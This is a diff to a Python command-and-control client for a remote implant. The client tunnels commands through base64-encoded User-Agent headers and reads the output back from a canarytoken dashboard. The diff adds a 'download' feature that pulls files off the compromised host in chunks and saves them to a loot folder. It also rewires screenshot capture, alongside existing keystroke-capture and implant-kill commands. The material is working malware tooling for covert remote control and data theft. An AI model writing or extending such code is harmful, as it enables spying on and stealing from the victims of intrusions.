@@ -43,6 +43,7 @@ screenshotdone = False
 ps = False
 waitForKeys = False
 lootpath = ""
+requestedfile = ""
 
 
 def generate_canarytoken():
@@ -105,10 +106,7 @@ def taskCommand(cmd):
     if pwd == True:
         cmd = "pwdtask:" + cmd
 
-    if cmd.startswith("fallback:"):
-        cmd = cmd
-
-    if cmd.startswith("keystrokes:"):
+    if cmd.startswith("fallback:") or cmd.startswith("keystrokes:") or cmd.startswith("screenshot:") or cmd.startswith("download:"):
         cmd = cmd
 
     else:
@@ -149,6 +147,7 @@ def getResults(lastdictsize):
     global screenshotdone
     screenshotdone = False
     global lootpath
+    global requestedfile
     global ps
 
     headers = {
@@ -193,7 +192,7 @@ def getResults(lastdictsize):
                     return (1)
 
                 # nightmare fuel
-                if cmd.startswith("chunked:"):
+                elif cmd.startswith("chunked:"):
                     command = cmd.replace("chunked:", "")
                     chunkedlen = int(command)
 
@@ -253,7 +252,7 @@ def getResults(lastdictsize):
                     fallback()
                     return (1)
 
-                if cmd.startswith("pic:"):
+                elif cmd.startswith("pic:"):
                     command = cmd.replace("pic:", "")
                     chunkedlen = int(command)
 
@@ -313,17 +312,72 @@ def getResults(lastdictsize):
 
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after screenshot...")
                     fallback()
-
                     return (1)
 
-                if cmd.startswith("res:"):
+                elif cmd.startswith("incomingfile:"):
+                    command = cmd.replace("incomingfile:", "")
+                    chunkedlen = int(command)
+
+                    # let user know we are breaking up the result
+                    if showChunkWarning:
+                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " File returning in multiple chunks")
+                        print(
+                            Fore.BLUE + "[!]" + Fore.RESET + " Attempting to reassemble file from " + command + " chunked requests...\n")
+                        showChunkWarning = False
+                        tChunk = threading.Thread(target=chunkAnimate)
+                        tChunk.start()
+
+                    while True:
+                        # now we start the logic loop of grabbing ALL chunks and reassembling them
+                        chunkedlist = []
+                        trash = []
+                        response = requests.get(canaryManagementURL, headers=headers)
+                        soupChunk = BeautifulSoup(response.text, 'html.parser')
+                        trash = soupChunk.find_all("td")
+
+                        for x in trash:
+                            if ("useragent" in x.text):
+                                chunkedlist.append(x.find_next_sibling().string.strip())
+
+                        # Loop until we have ALL the chunked data
+                        if (len(chunkedlist)) == (len(reslist) + chunkedlen):
+                            stringbuilder = ""
+                            holder = chunkedlist[:chunkedlen]
+                            break
+
+                        else:
+                            chunkedlist.clear()
+                            trash.clear()
+
+                    # need to reverse the list
+                    holder.reverse()
+                    for q in holder:
+                        stringbuilder += q
+
+                    decodedlist.append(stringbuilder)
+                    # Need to sleep for large requests
+                    time.sleep(1)
+                    doneChunked = True
+                    filebytes = base64.b64decode(decodedlist[-1])
+                    timestr = time.strftime("%Y%m%d-%H%M%S")
+
+                    with open(lootpath + timestr + requestedfile, "wb") as f:
+                        f.write(filebytes)
+                        f.close()
+                    print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " File saved to " + lootpath + timestr + "_" + requestedfile)
+
+                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after file grab...")
+                    fallback()
+                    return (1)
+
+                elif cmd.startswith("res:"):
                     command = cmd.replace("res:", "")
                     decodedlist.append(command)
 
-                if cmd.startswith("keys:"):
+                elif cmd.startswith("keys:"):
                     decodedlist.append(cmd)
 
-                if cmd.startswith("pwd:"):
+                elif cmd.startswith("pwd:"):
                     command = cmd.replace("pwd:", "")
                     global dir
                     dir = command.split(":res:")[0]
@@ -358,7 +412,6 @@ def getResults(lastdictsize):
                         pass
                     break
 
-
                 else:
                     if (pwd == True):
                         print(decodedlist[-1])
@@ -370,10 +423,10 @@ def getResults(lastdictsize):
 
 
         except Exception as e:
-            # print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
-            # exc_type, exc_obj, exc_tb = sys.exc_info()
-            # fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-            # print(exc_type, fname, exc_tb.tb_lineno)
+            #print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
+            #exc_type, exc_obj, exc_tb = sys.exc_info()
+            #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+            #print(exc_type, fname, exc_tb.tb_lineno)
             pass
 
     return (len(reslist) + 1)
@@ -521,19 +574,6 @@ def fallback():
         pass
 
 
-def screenshot():
-    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Sending screenshot command...")
-    cmd = ("saycheese:")
-    cmd = base64.b64encode(cmd.encode("utf-8"))
-    headers = {
-        "User-Agent": cmd,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
-        "Upgrade-Insecure-Requests": "1"}
-
-    response = requests.get(url, headers=headers)
-
-
 
 def killimplant(clean):
     if clean == False:
@@ -597,6 +637,7 @@ def main():
     global connected
     global url
     global lootpath
+    global requestedfile
     lootpath ="loot/template/"
     global canaryManagementURL
     try:
@@ -691,18 +732,6 @@ def main():
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
-            elif cmd.lower() == "screenshot":
-                if connected == True:
-                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
-                    time.sleep(1)
-                    fallback()
-                    time.sleep(1)
-                    screenshot()
-                    lastdictsize = getResults(lastdictsize)
-                else:
-                    print(
-                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
-
             elif cmd.lower() == "fallback":
                 if connected == True:
                     fallback()
@@ -735,13 +764,29 @@ def main():
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
-
-            elif cmd.lower() == "download":
+            elif cmd.lower() == "screenshot":
                 if connected == True:
-                    print("TODO")
+                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
+                    fallback()
+                    time.sleep(1)
+                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Sending screenshot command...")
+                    taskCommand("saycheese:")
+                    lastdictsize = getResults(lastdictsize)
                 else:
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+            elif cmd.startswith("download "):
+                if connected == True:
+                    requestedfile = cmd.split("download ")[1]
+                    fallback()
+                    time.sleep(1)
+                    taskCommand("download:" + requestedfile)
+                    lastdictsize = getResults(lastdictsize)
+                else:
+                    print(
+                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
 
             elif cmd.lower() == "create-implant":
                 if (canaryManagementURL != ""):
